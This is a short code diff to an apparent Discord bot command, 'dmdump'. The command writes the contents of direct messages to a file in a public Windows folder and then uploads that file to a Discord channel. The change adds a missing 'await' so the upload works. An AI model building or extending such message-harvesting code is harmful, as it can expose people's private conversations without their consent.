@@ -55,7 +55,7 @@ async def dmdump(ctx):
             with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
                 to_write = str(message.channel) + "> " + str(message.content) + "\n"
                 dmfile.write(to_write)
-        ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
+        await ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
 @bot.command()
 async def delete(ctx):
     try:
